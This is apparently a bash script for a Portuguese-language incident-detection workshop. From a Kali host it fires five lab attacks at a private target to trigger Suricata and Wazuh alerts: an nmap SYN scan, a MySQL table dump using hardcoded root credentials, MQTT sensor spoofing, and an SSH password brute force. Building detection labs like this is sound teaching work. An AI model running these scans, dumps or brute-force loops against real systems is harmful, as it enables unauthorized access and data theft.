#!/usr/bin/env bash
# =============================================================================
# injetar_ataques.sh — Workshop 10: Detecção e Resposta a Incidentes
# Dispara os 5 ataques do laboratório em sequência (do kali), enquanto
# acompanhamos os alertas nascendo no Suricata (eve.json) e no Wazuh.
#
# Uso (no kali):  bash injetar_ataques.sh
# Pré-requisitos: nmap, curl, mosquitto-clients, mysql-client, sshpass
#   sudo apt install -y nmap curl mosquitto-clients default-mysql-client sshpass
#
# Validado em 23/09/2026 — todos os alertas abaixo foram reproduzidos.
# =============================================================================
set -u

SRV=172.30.234.55   # srvdocker01 (alvo)
KALI=172.30.234.56  # kali (origem dos ataques)

echo "=== WS10: INJECAO DE ATAQUES (Suricata + Wazuh) ==="
echo "Alvo: $SRV (srvdocker01) | Origem: $KALI (kali)"
echo

# -----------------------------------------------------------------------------
echo ">>> [1/5] RECONHECIMENTO — nmap -sS"
echo "    Suricata: sid:1000004 'SCAN NMAP SYN - WS10' (threshold)"
# -----------------------------------------------------------------------------
nmap -sS -Pn -p 1-100 "$SRV"
sleep 5

# -----------------------------------------------------------------------------
echo
echo ">>> [2/5] CREDENCIAL HTTP EM CLARO — login do WS01"
echo "    Suricata: sid:1000001 'CREDENCIAL HTTP EM TEXTO CLARO - WS01/08'"
# -----------------------------------------------------------------------------
curl -s -X POST "http://$SRV:5000/" -d "username=admin&password=123456" \
  | grep -o "<h1>[^<]*</h1>"
sleep 5

# -----------------------------------------------------------------------------
echo
echo ">>> [3/5] EXFILTRACAO MYSQL — dump de tabela do WS03"
echo "    Suricata: sid:1000003 'EXFILTRACAO MYSQL - SELECT * FROM - WS03'"
echo "              + ET 2010937 'ET SCAN Suspicious inbound to mySQL port 3306'"
# -----------------------------------------------------------------------------
mysql -h "$SRV" -u root -proot_secret_2024 --skip-ssl \
  -e "SELECT * FROM app_db.clientes;" | head -3
sleep 5

# -----------------------------------------------------------------------------
echo
echo ">>> [4/5] SPOOFING DE SENSOR MQTT — WS04"
echo "    Suricata: sid:1000002 'MQTT CONNECT EM CLARO - WS04'"
# -----------------------------------------------------------------------------
mosquitto_pub -h "$SRV" -p 1883 -u sensor_camara1 -P sensor_senha_2024 \
  -t "sensores/camara1/temperatura" \
  -m '{"sensor":"camara1","metrica":"temperatura","valor":99.5,"unidade":"C","token":"tok_sensor_camara1_7f3a9c","timestamp":1}'
sleep 5

# -----------------------------------------------------------------------------
echo
echo ">>> [5/5] FORCA BRUTA SSH — 30 tentativas contra o srvdocker01"
echo "    Wazuh: regra 5760 (lvl 5) xN + regra 5551 (lvl 10, MITRE T1110)"
echo "    -> active response 'firewall-drop' bloqueia o kali por 300s"
echo "    (as flags PubkeyAuthentication=no forcam senha: o kali tem chave"
echo "     autorizada no servidor e sem elas o SSH autentica por publickey)"
echo "    (30 tentativas: o OpenSSH 9.8+ do servidor tem PerSourcePenalties"
echo "     e derruba conexoes por ~17s apos ~7 falhas — com 10 tentativas a"
echo "     regra 5551 (frequencia 8) pode nao disparar; validado em 23/09)"
# -----------------------------------------------------------------------------
for i in $(seq 1 30); do
  sshpass -p "senha_errada_$i" ssh -o PubkeyAuthentication=no \
    -o PreferredAuthentications=password -o StrictHostKeyChecking=no \
    -o ConnectTimeout=5 user1@"$SRV" "echo OK" 2>/dev/null
done
echo "    (se o active response estiver ativo, o kali fica bloqueado 300s:"
echo "     ping -> 100% loss e ssh -> Connection timed out)"

echo
echo "=== CONFERIR OS ALERTAS ==="
echo "Suricata: jq -r 'select(.event_type==\"alert\") | .alert.signature' ~/suricata/logs/eve.json | sort -u"
echo "Wazuh:    docker exec single-node-wazuh.manager-1 sh -c 'tail -50 /var/ossec/logs/alerts/alerts.json'"